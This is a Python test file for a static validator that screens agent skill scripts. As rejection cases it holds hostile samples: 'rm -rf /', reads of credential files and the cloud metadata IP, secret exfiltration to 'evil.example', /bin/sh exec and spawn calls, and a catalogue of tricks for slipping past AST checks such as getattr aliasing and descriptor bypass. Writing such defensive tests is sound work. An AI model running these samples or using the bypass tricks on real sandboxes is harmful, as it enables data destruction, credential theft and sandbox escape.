"""Phase-2 tests: static skill-script validator."""

from __future__ import annotations

from kiro_crew.skills_script_validator import validate_scripts, validate_skill_script


def test_clean_python_script_passes():
    ok, findings = validate_skill_script("run.py", "import json\nprint(json.dumps({'a': 1}))\n")
    assert ok is True
    assert findings == []


def test_rejects_non_python():
    ok, findings = validate_skill_script("run.sh", "echo hi\n")
    assert ok is False
    assert any("only Python" in f for f in findings)


def test_rejects_destructive():
    ok, findings = validate_skill_script("run.py", "import os\nos.system('rm -rf /tmp/x')\n")
    assert ok is False
    assert any("rm -rf" in f for f in findings)


def test_rejects_rmtree():
    ok, findings = validate_skill_script("run.py", "import shutil\nshutil.rmtree('/data')\n")
    assert ok is False
    assert any("rmtree" in f for f in findings)


def test_rejects_asyncio_egress():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio\nasyncio.open_connection('evil.example', 443)\n",
    )
    assert ok is False
    assert any("open_connection" in f for f in findings)


def test_rejects_asyncio_egress_aliased():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio as a\na.start_server(lambda r, w: None, '0.0.0.0', 80)\n",
    )
    assert ok is False
    assert any("start_server" in f for f in findings)


def test_benign_asyncio_control_flow_passes():
    ok, findings = validate_skill_script(
        "run.py",
        "import asyncio\n\nasync def main():\n    await asyncio.sleep(1)\n",
    )
    assert ok is True
    assert findings == []


def test_rejects_credential_access():
    ok, findings = validate_skill_script("run.py", "open('/home/u/.aws/credentials').read()\n")
    assert ok is False
    assert any("credential access" in f for f in findings)


def test_rejects_secret_env_getter():
    """os.getenv / os.environ.get on a secret-named var is rejected too, not just
    the os.environ["..."] subscript form."""
    for src in (
        "import os\nx = os.getenv('GITHUB_TOKEN')\n",
        "import os\nx = os.environ.get('API_SECRET')\n",
        "import os\nx = os.getenv('DB_PASSWORD')\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False
        assert any("secret env var" in f for f in findings)


def test_rejects_metadata_ip():
    ok, findings = validate_skill_script("run.py", "x = '169.254.169.254'\n")
    assert ok is False
    assert any("metadata IP" in f for f in findings)


def test_flags_network_egress():
    ok, findings = validate_skill_script("run.py", "import requests\nrequests.get('http://x')\n")
    assert ok is False
    assert any("network egress" in f for f in findings)


def test_rejects_webbrowser_egress():
    """webbrowser.open(url) is a covert egress channel — banned like the HTTP
    clients so a secret can't ride out in a launched URL."""
    ok, findings = validate_skill_script(
        "run.py", "import webbrowser\nwebbrowser.open('https://evil.example/?x=' + s)\n"
    )
    assert ok is False
    assert any("network egress import" in f for f in findings)
    ok2, f2 = validate_skill_script(
        "run.py", "from webbrowser import open as o\no('https://evil.example/?x')\n"
    )
    assert ok2 is False
    assert any("network egress import-from" in f for f in f2)


def test_rejects_oversize():
    big = "x = 1\n" * 2000  # > 4096 bytes
    ok, findings = validate_skill_script("run.py", big)
    assert ok is False
    assert any("too large" in f for f in findings)


def test_rejects_syntax_error():
    ok, findings = validate_skill_script("run.py", "def broken(:\n")
    assert ok is False
    assert any("syntax error" in f for f in findings)


def test_validate_scripts_aggregate():
    ok, report = validate_scripts(
        [
            {"filename": "good.py", "content": "print(1)\n"},
            {"filename": "bad.py", "content": "import os\nos.system('rm -rf /')\n"},
        ]
    )
    assert ok is False
    assert "bad.py" in report and "good.py" not in report

    ok2, report2 = validate_scripts([{"filename": "ok.py", "content": "print(1)\n"}])
    assert ok2 is True and report2 == {}


def test_ast_rejects_dynamic_import_remove():
    # The exact obfuscated payload a regex denylist misses.
    ok, findings = validate_skill_script("run.py", "__import__('os').remove('/tmp/x')\n")
    assert ok is False
    assert any("dynamic exec/import" in f for f in findings)
    assert any(".remove()" in f for f in findings)


def test_ast_rejects_eval_exec():
    ok, f1 = validate_skill_script("run.py", "eval('1+1')\n")
    assert ok is False and any("eval" in x for x in f1)
    ok2, f2 = validate_skill_script("run.py", "exec('x=1')\n")
    assert ok2 is False and any("exec" in x for x in f2)


def test_ast_rejects_dangerous_imports_and_calls():
    ok, f = validate_skill_script("run.py", "import subprocess\nsubprocess.run(['ls'])\n")
    assert ok is False
    assert any("dangerous import" in x for x in f)
    ok2, f2 = validate_skill_script("run.py", "from pathlib import Path\nPath('/x').unlink()\n")
    assert ok2 is False and any(".unlink()" in x for x in f2)


def test_ast_allows_benign_python():
    ok, findings = validate_skill_script(
        "run.py", "import json\nd = {'a': 1}\nprint(json.dumps(d))\n"
    )
    assert ok is True and findings == []


def test_rejects_aliased_network_import():
    ok, findings = validate_skill_script(
        "run.py", "import requests as r\nr.get('http://evil.example/x')\n"
    )
    assert ok is False
    assert any("network egress import" in f for f in findings)


def test_rejects_network_import_from_and_socket_alias():
    ok1, f1 = validate_skill_script("a.py", "from urllib import request\nrequest.urlopen('http://x')\n")
    assert ok1 is False and any("network egress import-from" in f for f in f1)
    ok2, f2 = validate_skill_script("b.py", "import socket as s\ns.socket()\n")
    assert ok2 is False and any("network egress import" in f for f in f2)


def test_rejects_from_import_dangerous_name():
    ok, findings = validate_skill_script("run.py", "from os import remove\nremove('/tmp/x')\n")
    assert ok is False
    assert any("dangerous import-from: os.remove" in f for f in findings)
    ok2, f2 = validate_skill_script("b.py", "from shutil import rmtree as rt\nrt('/x')\n")
    assert ok2 is False and any("rmtree" in f for f in f2)


def test_rejects_expanded_sensitive_paths():
    """The sensitive-path set is now the canonical security list, not a partial
    regex (GPT HIGH): .gnupg/.npmrc/.pypirc/.docker/config.json + governance
    trust-root files must all be rejected."""
    for path in (
        "~/.gnupg/secring.gpg",
        "~/.npmrc",
        "~/.pypirc",
        "~/.docker/config.json",
        "/home/u/.kiro/crew/security_policy.json",
    ):
        ok, findings = validate_skill_script("run.py", f"open('{path}').read()\n")
        assert ok is False and any("sensitive path" in f for f in findings), path


def test_env_environ_not_flagged_as_sensitive_path():
    """The .env path token must not false-positive on os.environ access."""
    ok, findings = validate_skill_script("run.py", "import os\nprint(os.environ.get('HOME'))\n")
    assert ok is True, findings


def test_rejects_aliased_dangerous_attribute():
    """A dangerous callable referenced (not called) off a dangerous module —
    `f = os.remove; f(x)` — must be rejected (GPT MEDIUM: indirect attr)."""
    ok, findings = validate_skill_script(
        "run.py", "import os\nf = os.remove\nf('/tmp/x')\n"
    )
    assert ok is False
    assert any("dangerous attribute" in f or "dangerous call" in f for f in findings)


def test_rejects_aliased_module_dangerous_attribute():
    """`import os as x; f = x.remove` must be rejected via alias resolution."""
    ok, findings = validate_skill_script("run.py", "import os as x\nf = x.remove\nf('/tmp/y')\n")
    assert ok is False
    assert any("dangerous attribute" in f for f in findings)


def test_rejects_namespace_subscript_on_dangerous_module():
    """`os.__dict__["execv"]` reaches the callable through a subscript.

    The attribute check cannot see it: the name lives in a string constant, not
    in the AST as an attribute. So the namespace handle is denied rather than
    the key — same reasoning as the `getattr` guard below.
    """
    for src in (
        'import os\nos.__dict__["execv"]("/bin/sh", ["sh"])\n',
        'import os as o\no.__dict__["execv"]("/bin/sh", ["sh"])\n',
        'import os\nvars(os)["execv"]("/bin/sh", ["sh"])\n',
        'import os\nos.__dict__["system"]("id")\n',
        'import os\nf = os.__dict__["execv"]\n',
        'import shutil\nshutil.__dict__["rmtree"]("/tmp/x")\n',
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_a_dangerous_builtin_bound_to_another_name():
    """`lookup = getattr; lookup(os, "execv")` calls through a different name.

    Every check keyed on the call site misses it, because `fn.id` is `lookup`.
    Rather than chase the binding through assignments, dicts and parameters, the
    bare name is rejected wherever it is loaded without being called.
    """
    for src in (
        'lookup = getattr\nimport os\nlookup(os, "execv")("/bin/sh", ["sh"])\n',
        'v = vars\nimport os\nv(os)["execv"]("/bin/sh", ["sh"])\n',
        'e = eval\ne("1+1")\n',
        'x = exec\nx("y=1")\n',
        'i = __import__\ni("os").remove("/tmp/x")\n',
        'd = {"g": getattr}\nimport os\nd["g"](os, "execv")()\n',
        'import os\ndef f(g):\n    return g(os, "execv")\nf(getattr)\n',
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_builtins_module():
    """Every denied bare call is reachable again as ``builtins.<name>``.

    The bare-name check looks for `eval`/`getattr` as a Name node, so the
    qualified spelling walks past it. The builtins are available without the
    import, so a script that reaches for the module is asking for exactly that
    spelling — banning the root closes all of them at once.
    """
    for src in (
        'import os, builtins\nbuiltins.getattr(os, "execv")("/bin/sh", ["sh"])\n',
        'import os, builtins\nbuiltins.vars(os)["execv"]("/bin/sh", ["sh"])\n',
        'import builtins\nbuiltins.eval("1+1")\n',
        'import builtins\nbuiltins.exec("x=1")\n',
        'import builtins\nbuiltins.compile("1", "<s>", "eval")\n',
        'import os, builtins as b\nb.getattr(os, "execv")("/bin/sh", ["sh"])\n',
        'from builtins import getattr as g\nimport os\ng(os, "execv")("/bin/sh", ["sh"])\n',
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_namespace_lookup_on_a_plain_object_is_allowed():
    """The guard is scoped to dangerous module roots, not to the builtin."""
    for src in (
        'class C:\n    pass\nc = C()\nx = getattr(c, "foo", None)\n',
        "class C:\n    pass\nc = C()\nd = vars(c)\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is True, (src, findings)


def test_rejects_getattr_on_dangerous_module():
    """`getattr(os, 'remove')` dynamic access must be rejected."""
    ok, findings = validate_skill_script("run.py", "import os\ngetattr(os, 'remove')('/tmp/y')\n")
    assert ok is False
    assert any("getattr" in f for f in findings)


def test_rejects_os_process_replacement():
    """`os.exec*` replaces this process with a program the script chose.

    ``os`` cannot be banned as an import root — a skill needs os.path and
    os.environ — so these calls are named individually. A denylist that only
    knew ``subprocess`` never saw them.
    """
    for src in (
        "import os\nos.execve('/bin/sh', ['/bin/sh'], {})\n",
        "import os\nos.execv('/bin/sh', ['sh'])\n",
        "import os\nos.execvp('sh', ['sh'])\n",
        "import os\nos.execl('/bin/sh', 'sh')\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src
        assert any("exec" in f for f in findings), findings


def test_rejects_os_process_creation():
    """`os.spawn*` / `posix_spawn` start a program alongside this one."""
    for src in (
        "import os\nos.spawnl(os.P_NOWAIT, '/bin/sh', 'sh')\n",
        "import os\nos.spawnv(os.P_NOWAIT, '/bin/sh', ['sh'])\n",
        "import os\nos.posix_spawn('/bin/sh', ['sh'], {})\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_os_fork():
    """`os.fork` / `forkpty` duplicate the interpreter."""
    for src in (
        "import os\nos.fork()\n",
        "import os\nos.forkpty()\n",
        "import os\nos.openpty()\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_os_startfile():
    """`os.startfile` hands a path to the Windows shell, which launches it.

    An `.exe` runs; a document runs its registered application. It is the
    Windows-only sibling of the exec family, and it reaches execution without
    naming `subprocess`.
    """
    for src in (
        "import os\nos.startfile('payload.exe')\n",
        "import os as o\no.startfile('payload.exe')\n",
        "from os import startfile\nstartfile('payload.exe')\n",
        "import os\nf = os.startfile\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_pty_import():
    """`pty.spawn` allocates a terminal and runs a program in it."""
    ok, findings = validate_skill_script("run.py", "import pty\npty.spawn('/bin/bash')\n")
    assert ok is False
    assert any("dangerous import" in f for f in findings)


def test_rejects_unsafe_deserialization():
    """Unpickling calls ``__reduce__`` on the incoming bytes — that is execution.

    Banned on the import root rather than the attribute name: the call-site
    check matches an attribute against every module, so banning ``load`` there
    would reject ``json.load`` too (see
    ``test_safe_parsers_are_not_flagged_as_deserialization``).
    """
    for src in (
        "import pickle\npickle.loads(b'x')\n",
        "import marshal\nmarshal.loads(b'x')\n",
        "from pickle import loads\nloads(b'x')\n",
        "import pickle as p\np.loads(b'x')\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_rejects_multiprocessing():
    """`Process(target=...)` runs a callable in a new interpreter.

    The payload is a callable rather than a command string, so nothing a
    string-oriented denylist matches ever appears.
    """
    ok, findings = validate_skill_script(
        "run.py", "import multiprocessing\nmultiprocessing.Process(target=print).start()\n"
    )
    assert ok is False
    assert any("dangerous import" in f for f in findings)


def test_rejects_runpy_and_code():
    """`runpy` runs a module as __main__; `code` evaluates source live."""
    for src in (
        "import runpy\nrunpy.run_module('http.server')\n",
        "import runpy\nrunpy.run_path('/tmp/x.py')\n",
        "import code\ncode.InteractiveInterpreter().runsource('1')\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, src


def test_safe_parsers_are_not_flagged_as_deserialization():
    """The guard against unsafe loaders must not reach the safe ones.

    This is why ``pickle``/``marshal`` are banned as import roots instead of
    adding ``load``/``loads`` to the attribute denylist, which is matched
    against every module.
    """
    for src in (
        "import json\nd = json.loads('{}')\n",
        "import json\nwith open('f') as h:\n    d = json.load(h)\n",
        "import tomllib\nwith open('f', 'rb') as h:\n    d = tomllib.load(h)\n",
        "import csv\nwith open('f') as h:\n    rows = list(csv.reader(h))\n",
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is True, (src, findings)
        assert findings == []


def test_benign_os_use_still_passes():
    """Naming os.exec*/spawn*/fork must not cost a skill os.path or os.environ."""
    ok, findings = validate_skill_script(
        "run.py",
        "import os\np = os.path.join('a', 'b')\nv = os.environ.get('LANG')\nprint(p, v)\n",
    )
    assert ok is True and findings == []


def test_rejects_builtin_descriptor_bypass():
    """``object.__getattribute__(os, "__dict__")["execv"]`` bypasses the
    namespace guard because the base is ``object``, not a dangerous module.

    The check must fire on builtin descriptor bases (object, type, super) when
    the first argument resolves to a dangerous module root.
    """
    for src in (
        'import os\nobject.__getattribute__(os, "__dict__")["execv"]("/bin/sh", ["sh"])\n',
        'import os\ntype.__getattribute__(os, "__dict__")["execv"]("/bin/sh", ["sh"])\n',
        'import os\nsuper.__getattribute__(os, "__dict__")["system"]("id")\n',
        'import os\nobject.__getattr__(os, "execv")("/bin/sh", ["sh"])\n',
        'import os as o\nobject.__getattribute__(o, "__dict__")["execv"]("/bin/sh", ["sh"])\n',
        'import shutil\nobject.__getattribute__(shutil, "__dict__")["rmtree"]("/tmp/x")\n',
    ):
        ok, findings = validate_skill_script("run.py", src)
        assert ok is False, (src, findings)
        assert any("builtin descriptor bypass" in f for f in findings), (src, findings)


def test_builtin_descriptor_on_non_dangerous_module_passes():
    """object.__getattribute__ on a non-dangerous target is benign."""
    for src in (
        'class C:\n    x = 1\nc = C()\nv = object.__getattribute__(c, "x")\n',
        'import json\nobject.__getattribute__(json, "dumps")\n',
    ):
        ok, findings = validate_skill_script("run.py", src)
        # json is not in _DANGEROUS_ATTR_ROOTS so this passes
        assert ok is True, (src, findings)
